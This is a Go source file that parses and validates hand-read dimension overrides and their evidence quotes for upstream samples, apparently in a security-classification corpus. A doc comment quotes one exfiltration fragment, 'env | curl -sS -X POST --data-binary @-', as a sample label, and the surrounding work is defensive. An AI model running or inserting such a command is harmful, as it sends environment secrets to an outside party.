// SPDX-License-Identifier: MIT

package manifest

import (
	"fmt"

	"gopkg.in/yaml.v3"
)

// Evidence locates the deciding element inside a sample.
//
// It is what turns a hand-read override into a `read` basis. Before it existed the reasoning
// behind each override lived in a YAML comment beside it — real judgements, made by opening
// the sample, and invisible to every check. A comment cannot be verified, so the attribution
// axis could not be scored from those samples even though a person had read every one.
type Evidence struct {
	File  string `yaml:"file"`
	Lines string `yaml:"lines"`
	Quote string `yaml:"quote"`
}

// DimensionOverride is a hand-read dimension for one upstream sample, optionally carrying the
// evidence for it.
//
// Two shapes parse. The short one is the original and stays valid:
//
//	200-clawhub-listing: [supply-chain, exfiltration]
//
// The long one adds the quote that makes the judgement checkable:
//
//	200-clawhub-listing:
//	  dimensions: [supply-chain, exfiltration]
//	  evidence:
//	    file: SKILL.md
//	    lines: "9"
//	    quote: 'env | curl -sS -X POST --data-binary @-'
//
// Both are kept deliberately. Rewriting 79 overrides in one pass is how a transcription error
// enters unnoticed, and an override without evidence is not wrong — it simply claims less, and
// the sample's attribution axis stays unscoreable until someone moves the quote in.
type DimensionOverride struct {
	Dimensions Targets
	Evidence   *Evidence
}

// longOverride is the mapping form. A separate type so KnownFields can reject a typo'd key:
// an ignored field here is a correction that silently does nothing.
type longOverride struct {
	Dimensions Targets   `yaml:"dimensions"`
	Evidence   *Evidence `yaml:"evidence"`
}

func (o *DimensionOverride) UnmarshalYAML(value *yaml.Node) error {
	if value.Kind == yaml.MappingNode {
		// Keys are checked by hand because yaml.Node.Decode has no KnownFields equivalent —
		// only the Decoder does, and by the time an UnmarshalYAML is called the node is
		// already detached from it. Without this, `dimensions` misspelled once silently
		// becomes an override with no dimensions.
		for i := 0; i+1 < len(value.Content); i += 2 {
			switch k := value.Content[i].Value; k {
			case "dimensions", "evidence":
			default:
				return fmt.Errorf("dimension override has unknown field %q "+
					"(expected `dimensions` or `evidence`)", k)
			}
		}
		var lo longOverride
		if err := value.Decode(&lo); err != nil {
			return err
		}
		if len(lo.Dimensions) == 0 {
			// An override with no dimensions looks like a correction and changes nothing.
			return fmt.Errorf("dimension override has evidence but no dimensions, so it " +
				"corrects nothing while appearing to")
		}
		if lo.Evidence != nil {
			if err := lo.Evidence.validate(); err != nil {
				return err
			}
		}
		o.Dimensions, o.Evidence = lo.Dimensions, lo.Evidence
		return nil
	}

	// Scalar or sequence: the short form.
	var t Targets
	if err := value.Decode(&t); err != nil {
		return err
	}
	o.Dimensions, o.Evidence = t, nil
	return nil
}

// validate refuses partial evidence.
//
// A quote with no file cannot be located when the sample has several; a file with no quote
// names a haystack and no needle. Either way the result is a `read` claim that nothing can
// confirm, which is precisely worse than claiming nothing at all.
func (e *Evidence) validate() error {
	switch {
	case e.File == "":
		return fmt.Errorf("evidence has no file")
	case e.Quote == "":
		return fmt.Errorf("evidence has no quote — the quote is what a checker goes and finds")
	case e.Lines == "":
		return fmt.Errorf("evidence has no lines")
	}
	return nil
}
